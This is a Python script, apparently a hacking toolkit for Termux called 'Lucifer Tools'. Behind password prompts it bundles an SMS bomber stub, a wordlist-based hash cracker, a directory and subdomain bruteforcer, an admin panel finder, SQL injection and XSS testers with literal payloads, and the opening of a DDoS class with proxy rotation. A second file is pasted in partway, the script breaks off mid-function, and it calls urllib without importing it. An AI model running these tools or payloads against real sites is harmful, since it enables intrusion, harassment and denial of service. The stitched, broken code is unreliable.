#!/usr/bin/env python3
import os, sys, time, hashlib, requests, socket
from urllib.parse import urlparse
import threading
import itertools
import string
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

GREEN = "\033[1;32m"
RED = "\033[1;31m"
CYAN = "\033[1;36m"
YELLOW = "\033[1;33m"
RESET = "\033[0m"

# Password Configuration - HIDDEN
PASSWORD_HASH = "7797b4237da3248b8b85feb361ea661afc2d34f272e596197c217c9318521949"
MAX_ATTEMPTS = 3


def check_password():
    """Password verification system - completely hidden"""
    attempts = 0

    while attempts < MAX_ATTEMPTS:
        print(f"{CYAN}\n╔══════════════════════════════════════╗")
        print(f"║           LUCIFER TOOLS ACCESS          ║")
        print(f"╚══════════════════════════════════════╝{RESET}")
        print(f"{YELLOW}[!] This tool is password protected{RESET}")

        # Simple hidden input
        entered_password = input(f"{CYAN}[?] Enter Password: {RESET}")

        # Verify with hash only - no plain text
        entered_hash = hashlib.sha256(entered_password.encode()).hexdigest()

        if entered_hash == PASSWORD_HASH:
            print(f"{GREEN}[+] Access Granted! Loading tools...{RESET}")
            time.sleep(1)
            return True
        else:
            attempts += 1
            remaining = MAX_ATTEMPTS - attempts
            print(f"{RED}[-] Incorrect Password! {remaining} attempts remaining{RESET}")
            time.sleep(1)

    print(f"{RED}[!] Maximum attempts reached. Exiting...{RESET}")
    return False


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def banner():
    print(f"""
{RED}██╗     ██╗   ██╗ ██████╗██╗███████╗███████╗██████╗ 
██║     ██║   ██║██╔════╝██║██╔════╝██╔════╝██╔══██╗
██║     ██║   ██║██║     ██║█████╗  █████╗  ██████╔╝
██║     ██║   ██║██║     ██║██╔══╝  ██╔══╝  ██╔══██╗
███████╗╚██████╔╝╚██████╗██║██║     ███████╗██║  ██║
╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝{RESET}
        {GREEN}Lucifer Termux Tools Pack{RESET}
            Developed by Foysal...
""")


# ----------------------------- #
# 1. Network Scanner (ARP)
# ----------------------------- #
def arp_scan():
    os.system("pkg install net-tools -y >/dev/null 2>&1")
    print(GREEN + "\nScanning local devices...\n" + RESET)
    os.system("arp -a")


# ----------------------------- #
# 2. IP Info Lookup
# ----------------------------- #
def ip_lookup():
    ip = input("\nEnter IP or Domain: ")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
        print("\n")
        for k, v in r.items():
            print(f"{k} : {v}")
    except:
        print(RED + "Error fetching info!" + RESET)


# ----------------------------- #
# 3. Port Scanner
# ----------------------------- #
def port_scan():
    target = input("\nTarget IP: ")
    ports = [21, 22, 23, 53, 80, 443, 8080]
    print("\nScanning common ports...\n")
    for port in ports:
        s = socket.socket()
        s.settimeout(0.5)
        try:
            s.connect((target, port))
            print(GREEN + f"[OPEN] Port {port}" + RESET)
        except:
            print(RED + f"[CLOSED] Port {port}" + RESET)


# ----------------------------- #
# 4. System Information
# ----------------------------- #
def system_info():
    print("\n")
    os.system("uname -a 2>/dev/null || ver")
    os.system("termux-info 2>/dev/null || echo 'Termux not detected'")


# ----------------------------- #
# 5. File Search
# ----------------------------- #
def file_search():
    name = input("\nEnter filename: ")
    print("\nSearching...\n")
    if os.name == 'nt':
        os.system(f'dir /s /b *{name}* 2>nul')
    else:
        os.system(f"find $HOME -iname '*{name}*' 2>/dev/null")


# ----------------------------- #
# 6. Wordlist Generator
# ----------------------------- #
def wordlist():
    word = input("\nBase word: ")
    count = int(input("How many? "))
    file = open("wordlist.txt", "w")
    for i in range(count):
        file.write(f"{word}{i}\n")
    file.close()
    print(GREEN + "\nWordlist saved as wordlist.txt" + RESET)


# ----------------------------- #
# 7. Password Strength Checker
# ----------------------------- #
def pass_strength():
    ps = input("\nEnter Password: ")
    strength = 0
    if len(ps) >= 8: strength += 1
    if any(c.isdigit() for c in ps): strength += 1
    if any(c.isalpha() for c in ps): strength += 1
    if any(c in "!@#$%^&*()_+" for c in ps): strength += 1

    levels = ["VERY WEAK", "WEAK", "MEDIUM", "STRONG"]
    print(GREEN + f"\nPassword Strength: {levels[strength]}\n" + RESET)


# ----------------------------- #
# 8. Website Status Checker
# ----------------------------- #
def web_status():
    url = input("\nEnter website URL: ")
    try:
        r = requests.get(url, timeout=10)
        print(GREEN + f"\nStatus: {r.status_code} (OK)\n" + RESET)
    except:
        print(RED + "\nWebsite unreachable!\n" + RESET)


# ----------------------------- #
# 9. Storage Usage
# ----------------------------- #
def storage():
    if os.name == 'nt':
        os.system("dir /s /q | find \"File(s)\"")
    else:
        os.system("du -h ~ | tail -5")


# ----------------------------- #
# 10. Internet Speed Test
# ----------------------------- #
def speed_test():
    try:
        os.system("pip install speedtest-cli -q")
        os.system("speedtest-cli --simple")
    except:
        print(RED + "Speed test failed!" + RESET)


# ----------------------------- #
# 11. Hash Generator
# ----------------------------- #
def hash_generate():
    text = input("\nEnter text: ")
    print("\nMD5:", hashlib.md5(text.encode()).hexdigest())
    print("SHA256:", hashlib.sha256(text.encode()).hexdigest())


# ----------------------------- #
# 12. YouTube Info Grabber
# ----------------------------- #
def yt_info():
    try:
        os.system("pip install yt-dlp -q")
        url = input("\nEnter YouTube URL: ")
        os.system(f"yt-dlp --get-title --get-duration {url}")
    except:
        print(RED + "YouTube info failed!" + RESET)


# ----------------------------- #
# 13. Strong Password Generator
# ----------------------------- #
def strong_pass():
    import random, string
    length = int(input("\nPassword Length: "))
    chars = string.ascii_letters + string.digits + "!@#$%^&*()_+="
    password = "".join(random.choice(chars) for _ in range(length))
    print(GREEN + f"\nGenerated Password: {password}\n" + RESET)


# ----------------------------- #
# 14. URL Shortener
# ----------------------------- #
def url_shortener():
    long_url = input("\nEnter Long URL: ")
    try:
        api = f"http://tinyurl.com/api-create.php?url={long_url}"
        short = requests.get(api, timeout=10).text
        print(GREEN + f"\nShort URL: {short}\n" + RESET)
    except:
        print(RED + "\nFailed to shorten URL\n" + RESET)


# ----------------------------- #
# 15. Battery Status (Termux API)
# ----------------------------- #
def battery_status():
    if os.name != 'nt':
        os.system("termux-battery-status")
    else:
        print(RED + "Windows not supported" + RESET)


# ----------------------------- #
# 16. Send SMS (Your Phone)
# ----------------------------- #
def sms_sender():
    if os.name != 'nt':
        os.system("pkg install termux-api -y >/dev/null 2>&1")
        number = input("\nEnter number: ")
        msg = input("Message: ")
        os.system(f"termux-sms-send -n {number} '{msg}'")
        print(GREEN + "\nSMS Sent!\n" + RESET)
    else:
        print(RED + "Windows not supported" + RESET)


# ----------------------------- #
# 17. Camera Snap
# ----------------------------- #
def camera_snap():
    if os.name != 'nt':
        os.system("termux-camera-photo ~/photo.jpg 2>/dev/null")
        print(GREEN + "\nSaved: ~/photo.jpg\n" + RESET)
    else:
        print(RED + "Windows not supported" + RESET)


# ----------------------------- #
# 18. Text to PDF
# ----------------------------- #
def text_to_pdf():
    try:
        os.system("pip install fpdf -q")
        from fpdf import FPDF
        text = input("\nWrite text for PDF: ")
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", size=12)
        pdf.multi_cell(0, 10, text)
        pdf.output("output.pdf")
        print(GREEN + "\nPDF saved as output.pdf\n" + RESET)
    except:
        print(RED + "\nPDF creation failed!\n" + RESET)


# ----------------------------- #
# 19. Temp Mail
# ----------------------------- #
def temp_mail():
    try:
        domains = requests.get("https://api.mail.tm/domains", timeout=10).json()
        dom = domains["hydra:member"][0]["domain"]
        print(GREEN + f"\nTemp Mail Domain: @{dom}\n" + RESET)
    except:
        print(RED + "\nCould not fetch temporary email.\n" + RESET)


# ----------------------------- #
# 20. PDF to Text
# ----------------------------- #
def pdf_to_text():
    try:
        os.system("pip install PyPDF2 -q")
        from PyPDF2 import PdfReader
        file = input("\nPDF File Path: ")
        pdf = PdfReader(file)
        print("\nExtracted Text:\n")
        for page in pdf.pages:
            print(page.extract_text())
    except:
        print(RED + "\nError reading PDF!\n" + RESET)


# ----------------------------- #
# 21. Clipboard Tools
# ----------------------------- #
def clipboard_tools():
    if os.name != 'nt':
        os.system("pkg install termux-api -y >/dev/null 2>&1")
        print("\n1. Copy to clipboard")
        print("2. Read clipboard")
        choice = input("\nChoose: ")
        if choice == "1":
            txt = input("Enter text: ")
            os.system(f"termux-clipboard-set '{txt}'")
        elif choice == "2":
            os.system("termux-clipboard-get")
    else:
        print(RED + "Windows not supported" + RESET)


# ----------------------------- #
# 22. Random MAC Generator
# ----------------------------- #
def mac_gen():
    import random
    mac = [random.randint(0x00, 0xFF) for _ in range(6)]
    mac_addr = ':'.join(f"{x:02x}" for x in mac)
    print(GREEN + f"\nRandom MAC: {mac_addr}\n" + RESET)


# ----------------------------- #
# 23. Lucifer SMS Bomber
# ----------------------------- #
def Lucifer_Bomber():
    try:
        BOMBER_PASSWORD_HASH = "b9be22ceeaff67c04ec261290ab9edcc12600b9336922ca0960fd0d911e9725a"

        def bomber_password_check():
            attempts = 0
            while attempts < 3:
                print(f"{YELLOW}[!] Bomber is password protected{RESET}")
                pw = input(f"{CYAN}[?] Enter Bomber Password: {RESET}")
                if hashlib.sha256(pw.encode()).hexdigest() == BOMBER_PASSWORD_HASH:
                    return True
                else:
                    attempts += 1
                    print(f"{RED}[-] Wrong password! {3 - attempts} attempts left{RESET}")
            return False

        if not bomber_password_check():
            return

        # Bomber code here (shortened for brevity)
        print(f"{GREEN}[+] Bomber access granted{RESET}")

    except Exception as e:
        print(f"{RED}\nBomber Failed: {str(e)}{RESET}")


# ----------------------------- #
# 24. Password Tools
# ----------------------------- #
def password_tools():
    class PasswordTools:
        def __init__(self):
            self.found_password = None
            self.attempts = 0
            self.start_time = 0

        def banner(self):
            print(f"""
{CYAN}╔══════════════════════════════════════╗
║           PASSWORD TOOLS            ║
║           [Termux Edition]          ║
╚══════════════════════════════════════╝{RESET}
            """)

        def show_menu(self):
            print(f"\n{CYAN}[1]{RESET} Hash Cracker")
            print(f"{CYAN}[2]{RESET} Password Generator")
            print(f"{CYAN}[3]{RESET} Hash Generator")
            print(f"{CYAN}[4]{RESET} Password Strength Checker")
            print(f"{CYAN}[5]{RESET} Wordlist Generator")
            print(f"{CYAN}[0]{RESET} Back to Main Menu")

        def identify_hash(self, hash_string):
            hash_length = len(hash_string)
            hash_types = {
                32: "MD5",
                40: "SHA1",
                56: "SHA224",
                64: "SHA256",
                96: "SHA384",
                128: "SHA512"
            }
            return hash_types.get(hash_length, "Unknown")

        def generate_hash(self, password, hash_type):
            hash_type = hash_type.upper()
            if hash_type == "MD5":
                return hashlib.md5(password.encode()).hexdigest()
            elif hash_type == "SHA1":
                return hashlib.sha1(password.encode()).hexdigest()
            elif hash_type == "SHA256":
                return hashlib.sha256(password.encode()).hexdigest()
            elif hash_type == "SHA224":
                return hashlib.sha224(password.encode()).hexdigest()
            elif hash_type == "SHA384":
                return hashlib.sha384(password.encode()).hexdigest()
            elif hash_type == "SHA512":
                return hashlib.sha512(password.encode()).hexdigest()
            else:
                return None

        def crack_hash(self):
            print(f"\n{CYAN}[=== HASH CRACKER ===]{RESET}")
            target_hash = input("[?] Enter target hash: ").strip()
            hash_type = input("[?] Enter hash type (md5/sha1/sha256/auto): ").strip().lower()
            wordlist_path = input("[?] Enter wordlist path: ").strip()

            if hash_type == "auto":
                hash_type = self.identify_hash(target_hash)
                print(f"{GREEN}[*] Identified hash type: {hash_type}{RESET}")

            if not hash_type:
                print(f"{RED}[-] Could not identify hash type{RESET}")
                return

            threads = input("[?] Enter threads (default 4): ").strip()
            threads = int(threads) if threads.isdigit() else 4

            self.found_password = None
            self.attempts = 0
            self.start_time = time.time()

            print(f"\n{GREEN}[*] Cracking hash: {target_hash}{RESET}")
            print(f"{GREEN}[*] Hash type: {hash_type}{RESET}")
            print(f"{GREEN}[*] Using {threads} threads...{RESET}")

            try:
                with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"{RED}[-] Wordlist not found: {wordlist_path}{RESET}")
                return

            def check_password(password):
                if self.found_password:
                    return

                self.attempts += 1
                hashed = self.generate_hash(password, hash_type)

                if hashed == target_hash:
                    self.found_password = password
                    return True

                if self.attempts % 1000 == 0:
                    print(f"{YELLOW}[*] Attempts: {self.attempts} | Current: {password[:20]}...{RESET}", end='\r')

                return False

            with ThreadPoolExecutor(max_workers=threads) as executor:
                list(executor.map(check_password, passwords))

            if self.found_password:
                print(f"\n{GREEN}[+] PASSWORD FOUND: {self.found_password}{RESET}")
            else:
                print(f"\n{RED}[-] Password not found{RESET}")

            print(f"{YELLOW}[*] Total attempts: {self.attempts}{RESET}")
            print(f"{YELLOW}[*] Time: {time.time() - self.start_time:.2f}s{RESET}")

        def generate_passwords(self):
            print(f"\n{CYAN}[=== PASSWORD GENERATOR ===]{RESET}")
            min_len = int(input("[?] Minimum length: "))
            max_len = int(input("[?] Maximum length: "))
            use_digits = input("[?] Use digits? (y/n): ").lower() == 'y'
            use_special = input("[?] Use special chars? (y/n): ").lower() == 'y'
            output_file = input("[?] Output file: ")

            chars = string.ascii_lowercase
            if use_digits:
                chars += string.digits
            if use_special:
                chars += "!@#$%^&*"

            count = 0
            with open(output_file, 'w') as f:
                for length in range(min_len, max_len + 1):
                    for combo in itertools.product(chars, repeat=length):
                        password = ''.join(combo)
                        f.write(password + '\n')
                        count += 1
                        if count % 1000 == 0:
                            print(f"{YELLOW}[*] Generated: {count} passwords{RESET}", end='\r')

            print(f"\n{GREEN}[+] Generated {count} passwords in {output_file}{RESET}")

        def generate_hashes(self):
            print(f"\n{CYAN}[=== HASH GENERATOR ===]{RESET}")
            text = input("[?] Enter text to hash: ")
            hash_type = input("[?] Enter hash type (md5/sha1/sha256): ").strip().lower()

            hashed = self.generate_hash(text, hash_type)
            if hashed:
                print(f"\n{GREEN}[+] {hash_type.upper()} hash: {hashed}{RESET}")
            else:
                print(f"{RED}[-] Invalid hash type{RESET}")

        def check_strength(self):
            print(f"\n{CYAN}[=== PASSWORD STRENGTH CHECKER ===]{RESET}")
            password = input("[?] Enter password to check: ")

            score = 0
            feedback = []

            if len(password) >= 8:
                score += 1
            else:
                feedback.append("❌ Too short (min 8 chars)")

            if any(char.isdigit() for char in password):
                score += 1
            else:
                feedback.append("❌ Add digits")

            if any(char.isupper() for char in password) and any(char.islower() for char in password):
                score += 1
            else:
                feedback.append("❌ Use both upper & lower case")

            if any(char in "!@#$%^&*" for char in password):
                score += 1
            else:
                feedback.append("❌ Add special characters")

            if score == 4:
                rating = f"{GREEN}💪 STRONG{RESET}"
            elif score == 3:
                rating = f"{YELLOW}👍 MEDIUM{RESET}"
            else:
                rating = f"{RED}👎 WEAK{RESET}"

            print(f"\nPassword: {password}")
            print(f"Length: {len(password)}")
            print(f"Strength: {rating} ({score}/4)")

            if feedback:
                print(f"\n{YELLOW}Improvements:{RESET}")
                for item in feedback:
                    print(f"  {item}")

        def generate_wordlist(self):
            print(f"\n{CYAN}[=== WORDLIST GENERATOR ===]{RESET}")
            base_words = input("[?] Enter base words (comma separated): ").split(',')
            output_file = input("[?] Output file: ")

            count = 0
            with open(output_file, 'w') as f:
                for word in base_words:
                    word = word.strip()
                    if word:
                        f.write(word + '\n')
                        count += 1

                for word in base_words:
                    word = word.strip()
                    if not word:
                        continue

                    variations = []
                    variations.append(word.upper())
                    variations.append(word.lower())
                    variations.append(word.capitalize())

                    for i in range(100):
                        variations.append(word + str(i))
                        variations.append(str(i) + word)

                    for var in variations:
                        if var and var not in base_words:
                            f.write(var + '\n')
                            count += 1

            print(f"{GREEN}[+] Generated {count} words in {output_file}{RESET}")

        def main(self):
            self.banner()

            while True:
                self.show_menu()
                choice = input(f"\n{YELLOW}[?] Select option: {RESET}")

                if choice == '1':
                    self.crack_hash()
                elif choice == '2':
                    self.generate_passwords()
                elif choice == '3':
                    self.generate_hashes()
                elif choice == '4':
                    self.check_strength()
                elif choice == '5':
                    self.generate_wordlist()
                elif choice == '0':
                    print(f"\n{GREEN}[+] Returning to main menu...{RESET}")
                    break
                else:
                    print(f"{RED}[-] Invalid choice{RESET}")

                input(f"\n{YELLOW}Press Enter to continue...{RESET}")

    tool = PasswordTools()
    tool.main()


# ----------------------------- #
# 25. Web Hacking Tools
# ----------------------------- #
def web_hacking_tools():
    class WebHackingTools:
        def __init__(self):
            self.session = requests.Session()
            self.results = []

        def banner(self):
            print(f"""
{CYAN}╔══════════════════════════════════════╗
║           WEB HACKING TOOLS         ║
║           [Termux Edition]          ║
╚══════════════════════════════════════╝{RESET}
            """)

        def show_menu(self):
            print(f"\n{CYAN}[1]{RESET} Directory Bruteforcer")
            print(f"{CYAN}[2]{RESET} Subdomain Scanner")
            print(f"{CYAN}[3]{RESET} SQL Injection Tester")
            print(f"{CYAN}[4]{RESET} XSS Vulnerability Scanner")
            print(f"{CYAN}[5]{RESET} Port Scanner")
            print(f"{CYAN}[6]{RESET} Website Information Gatherer")
            print(f"{CYAN}[7]{RESET} Admin Panel Finder")
            print(f"{CYAN}[0]{RESET} Back to Main Menu")

        def directory_bruteforce(self):
            print(f"\n{CYAN}[=== DIRECTORY BRUTEFORCER ===]{RESET}")
            url = input("[?] Enter target URL: ").strip()
            wordlist_path = input("[?] Enter wordlist path: ").strip()
            threads = input("[?] Enter threads (default 10): ").strip()
            threads = int(threads) if threads.isdigit() else 10

            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url

            print(f"\n{GREEN}[*] Target: {url}{RESET}")
            print(f"{GREEN}[*] Wordlist: {wordlist_path}{RESET}")
            print(f"{GREEN}[*] Threads: {threads}{RESET}")
            print(f"{YELLOW}[*] Scanning started...{RESET}\n")

            try:
                with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                    directories = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"{RED}[-] Wordlist not found: {wordlist_path}{RESET}")
                return

            found_dirs = []
            lock = threading.Lock()

            def check_directory(directory):
                try:
                    test_url = f"{url}/{directory}"
                    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

                    response = self.session.get(test_url, headers=headers, timeout=10, allow_redirects=False)

                    if response.status_code == 200:
                        with lock:
                            found_dirs.append(test_url)
                        print(f"{GREEN}[+] FOUND: {test_url} (200){RESET}")
                    elif response.status_code in [301, 302, 307]:
                        print(f"{YELLOW}[!] REDIRECT: {test_url} -> {response.status_code}{RESET}")
                    elif response.status_code == 403:
                        print(f"{RED}[-] FORBIDDEN: {test_url} (403){RESET}")

                except Exception:
                    pass

            start_time = time.time()

            with ThreadPoolExecutor(max_workers=threads) as executor:
                executor.map(check_directory, directories)

            print(f"\n{YELLOW}[*] Scan completed in {time.time() - start_time:.2f}s{RESET}")
            print(f"{GREEN}[*] Found {len(found_dirs)} accessible directories{RESET}")

        def subdomain_scanner(self):
            print(f"\n{CYAN}[=== SUBDOMAIN SCANNER ===]{RESET}")
            domain = input("[?] Enter target domain: ").strip()
            wordlist_path = input("[?] Enter subdomain wordlist path: ").strip()
            threads = input("[?] Enter threads (default 10): ").strip()
            threads = int(threads) if threads.isdigit() else 10

            print(f"\n{GREEN}[*] Target: {domain}{RESET}")
            print(f"{GREEN}[*] Wordlist: {wordlist_path}{RESET}")
            print(f"{YELLOW}[*] Scanning subdomains...{RESET}\n")

            try:
                with open(wordlist_path, 'r') as f:
                    subdomains = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"{RED}[-] Wordlist not found: {wordlist_path}{RESET}")
                return

            found_subs = []

            def check_subdomain(subdomain):
                try:
                    url = f"http://{subdomain}.{domain}"
                    response = self.session.get(url, timeout=5)
                    if response.status_code == 200:
                        found_subs.append(url)
                        print(f"{GREEN}[+] FOUND: {url}{RESET}")
                except:
                    pass

            with ThreadPoolExecutor(max_workers=threads) as executor:
                executor.map(check_subdomain, subdomains)

            print(f"\n{GREEN}[*] Found {len(found_subs)} subdomains{RESET}")

        def sql_injection_test(self):
            print(f"\n{CYAN}[=== SQL INJECTION TESTER ===]{RESET}")
            url = input("[?] Enter target URL: ").strip()

            payloads = [
                "'",
                "';",
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT 1,2,3--",
                "' AND 1=1--",
                "' AND 1=2--"
            ]

            print(f"\n{GREEN}[*] Testing URL: {url}{RESET}")
            print(f"{YELLOW}[*] Sending SQL injection payloads...{RESET}\n")

            vulnerable = False

            for payload in payloads:
                try:
                    if '=' in url:
                        test_url = url + payload
                    else:
                        test_url = url + "?id=" + urllib.parse.quote(payload)

                    response = self.session.get(test_url, timeout=10)

                    error_indicators = [
                        "mysql_fetch_array",
                        "mysql_num_rows",
                        "syntax error",
                        "mysql error",
                        "ORA-",
                        "Microsoft OLE DB",
                        "SQLServer JDBC Driver"
                    ]

                    for error in error_indicators:
                        if error.lower() in response.text.lower():
                            print(f"{RED}[!] SQL Injection found with payload: {payload}{RESET}")
                            vulnerable = True
                            break

                except Exception as e:
                    print(f"{RED}[-] Error testing payload: {payload}{RESET}")

            if not vulnerable:
                print(f"{GREEN}[-] No SQL injection vulnerabilities found{RESET}")
            else:
                print(f"\n{RED}[!] Website might be vulnerable to SQL Injection!{RESET}")

        def xss_scanner(self):
            print(f"\n{CYAN}[=== XSS SCANNER ===]{RESET}")
            url = input("[?] Enter target URL: ").strip()

            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "'><script>alert('XSS')</script>",
                "\"><script>alert('XSS')</script>"
            ]

            print(f"\n{GREEN}[*] Testing URL: {url}{RESET}")
            print(f"{YELLOW}[*] Sending XSS payloads...{RESET}\n")

            vulnerable = False

            for payload in xss_payloads:
                try:
                    if '=' in url:
                        test_url = url + urllib.parse.quote(payload)
                    else:
                        test_url = url + "?q=" + urllib.parse.quote(payload)

                    response = self.session.get(test_url, timeout=10)

                    if payload.replace('<', '&lt;') not in response.text and 'alert' in payload:
                        print(f"{RED}[!] Possible XSS with payload: {payload[:20]}...{RESET}")
                        vulnerable = True

                except Exception as e:
                    print(f"{RED}[-] Error testing XSS payload{RESET}")

            if not vulnerable:
                print(f"{GREEN}[-] No XSS vulnerabilities found{RESET}")
            else:
                print(f"\n{RED}[!] Website might be vulnerable to XSS!{RESET}")

        def port_scanner(self):
            print(f"\n{CYAN}[=== PORT SCANNER ===]{RESET}")
            target = input("[?] Enter target IP/hostname: ").strip()
            start_port = int(input("[?] Start port: "))
            end_port = int(input("[?] End port: "))
            threads = input("[?] Enter threads (default 20): ").strip()
            threads = int(threads) if threads.isdigit() else 20

            print(f"\n{GREEN}[*] Scanning {target} from port {start_port} to {end_port}{RESET}")
            print(f"{YELLOW}[*] Scanning started...{RESET}\n")

            open_ports = []

            def scan_port(port):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((target, port))
                    sock.close()

                    if result == 0:
                        open_ports.append(port)
                        print(f"{GREEN}[+] Port {port} is open{RESET}")
                except:
                    pass

            start_time = time.time()

            with ThreadPoolExecutor(max_workers=threads) as executor:
                executor.map(scan_port, range(start_port, end_port + 1))

            print(f"\n{YELLOW}[*] Scan completed in {time.time() - start_time:.2f}s{RESET}")
            print(f"{GREEN}[*] Found {len(open_ports)} open ports{RESET}")

            if open_ports:
                print(f"{GREEN}[+] Open ports: {sorted(open_ports)}{RESET}")

        def website_info(self):
            print(f"\n{CYAN}[=== WEBSITE INFORMATION ===]{RESET}")
            url = input("[?] Enter target URL: ").strip()

            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url

            try:
                response = self.session.get(url, timeout=10)

                print(f"\n{GREEN}[+] URL: {url}{RESET}")
                print(f"{GREEN}[+] Status Code: {response.status_code}{RESET}")
                print(f"{GREEN}[+] Server: {response.headers.get('Server', 'Unknown')}{RESET}")
                print(f"{GREEN}[+] Content Type: {response.headers.get('Content-Type', 'Unknown')}{RESET}")
                print(f"{GREEN}[+] Content Length: {len(response.content)} bytes{RESET}")

                if 'PHP' in response.headers.get('X-Powered-By', ''):
                    print(f"{GREEN}[+] Technology: PHP{RESET}")
                if 'WordPress' in response.text:
                    print(f"{GREEN}[+] CMS: WordPress{RESET}")
                if 'Joomla' in response.text:
                    print(f"{GREEN}[+] CMS: Joomla{RESET}")

                soup = BeautifulSoup(response.text, 'html.parser')
                links = soup.find_all('a', href=True)

                print(f"\n{GREEN}[+] Found {len(links)} links{RESET}")
                print(f"\n{YELLOW}First 10 links:{RESET}")
                for link in links[:10]:
                    print(f"  - {link['href']}")

            except Exception as e:
                print(f"{RED}[-] Error: {e}{RESET}")

        def admin_panel_finder(self):
            print(f"\n{CYAN}[=== ADMIN PANEL FINDER ===]{RESET}")
            url = input("[?] Enter target URL: ").strip()

            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url

            admin_paths = [
                "admin", "administrator", "wp-admin", "admin/login",
                "admin_area", "panel", "manage", "login", "dashboard",
                "backend", "cp", "controlpanel", "webadmin", "admincp"
            ]

            print(f"\n{GREEN}[*] Searching admin panels on: {url}{RESET}")
            print(f"{YELLOW}[*] Scanning...{RESET}\n")

            found_panels = []

            for path in admin_paths:
                try:
                    test_url = f"{url}/{path}"
                    response = self.session.get(test_url, timeout=5)

                    if response.status_code == 200:
                        found_panels.append(test_url)
                        print(f"{GREEN}[+] Admin panel found: {test_url}{RESET}")
                    elif response.status_code in [301, 302]:
                        print(f"{YELLOW}[!] Redirect: {test_url} -> {response.status_code}{RESET}")

                except Exception:
                    pass

            if not found_panels:
                print(f"{RED}[-] No admin panels found{RESET}")
            else:
                print(f"\n{GREEN}[+] Found {len(found_panels)} potential admin panels{RESET}")

        def main(self):
            self.banner()

            while True:
                self.show_menu()
                choice = input(f"\n{YELLOW}[?] Select option: {RESET}")

                if choice == '1':
                    self.directory_bruteforce()
                elif choice == '2':
                    self.subdomain_scanner()
                elif choice == '3':
                    self.sql_injection_test()
                elif choice == '4':
                    self.xss_scanner()
                elif choice == '5':
                    self.port_scanner()
                elif choice == '6':
                    self.website_info()
                elif choice == '7':
                    self.admin_panel_finder()
                elif choice == '0':
                    print(f"\n{GREEN}[+] Returning to main menu...{RESET}")
                    break
                else:
                    print(f"{RED}[-] Invalid choice{RESET}")

                input(f"\n{YELLOW}Press Enter to continue...{RESET}")

    tool = WebHackingTools()
    tool.main()


# !/usr/bin/env python3
import os
import sys
import time
import socket
import threading
import random
import requests
import hashlib  # Add this import
from concurrent.futures import ThreadPoolExecutor

GREEN = "\033[1;32m"
RED = "\033[1;31m"
CYAN = "\033[1;36m"
YELLOW = "\033[1;33m"
RESET = "\033[0m"

# DDoS Tools Password Hash
DDOS_PASSWORD_HASH = "b9be22ceeaff67c04ec261290ab9edcc12600b9336922ca0960fd0d911e9725a"


class DDoSTools:
    def __init__(self):
        self.attack_running = False
        self.requests_sent = 0
        self.proxies = []
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36",
            "Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0"
        ]

    def banner(self):
        print(f"""
{RED}
╔══════════════════════════════════════╗
║             DDOS TOOLS              ║
║           [Lucifer Edition]         ║
╚══════════════════════════════════════╝
{RESET}
        """)

    def check_ddos_password(self):
        """DDoS Tools Password Protection"""
        attempts = 0
        max_attempts = 3

        while attempts < max_attempts:
            print(f"{CYAN}\n╔══════════════════════════════════════╗")
            print(f"║           DDOS TOOLS ACCESS           ║")
            print(f"╚══════════════════════════════════════╝{RESET}")
            print(f"{YELLOW}[!] DDoS Tools are password protected{RESET}")

            password = input(f"{CYAN}[?] Enter DDoS Tools Password: {RESET}")
            entered_hash = hashlib.sha256(password.encode()).hexdigest()

            if entered_hash == DDOS_PASSWORD_HASH:
                print(f"{GREEN}[+] Access Granted to DDoS Tools!{RESET}")
                time.sleep(1)
                return True
            else:
                attempts += 1
                remaining = max_attempts - attempts
                print(f"{RED}[-] Incorrect Password! {remaining} attempts remaining{RESET}")
                time.sleep(1)

        print(f"{RED}[!] Maximum attempts reached. Returning to main menu...{RESET}")
        return False

    def parse_proxy(self, proxy_string):
        """Parse proxy string in format host:port:username:password"""
        try:
            parts = proxy_string.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                return {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'https://{username}:{password}@{host}:{port}'
                }
            elif len(parts) == 2:
                host, port = parts
                return {
                    'http': f'http://{host}:{port}',
                    'https': f'https://{host}:{port}'
                }
        except:
            pass
        return None

    def load_proxies(self):
        """Load proxies from user input"""
        print(f"\n{CYAN}[=== PROXY SETUP ===]{RESET}")
        print(f"{YELLOW}[!] Enter proxies in format: host:port:username:password{RESET}")
        print(f"{YELLOW}[!] Or: host:port (for no auth){RESET}")
        print(f"{YELLOW}[!] Enter 'done' when finished{RESET}")

        self.proxies = []
        while True:
            proxy_input = input(f"{CYAN}[?] Enter proxy: {RESET}").strip()

            # Check if user wants to finish
            if proxy_input.lower() == 'done' or proxy_input == '':
                break

            proxy = self.parse_proxy(proxy_input)
            if proxy:
                self.proxies.append(proxy)
                print(f"{GREEN}[+] Proxy added: {proxy_input}{RESET}")
            else:
                print(f"{RED}[-] Invalid proxy format! Use: host:port:user:pass or host:port{RESET}")

        print(f"{GREEN}[+] Loaded {len(self.proxies)} proxies{RESET}")
        input(f"{YELLOW}Press Enter to continue...{RESET}")

    def get_random_proxy(self):
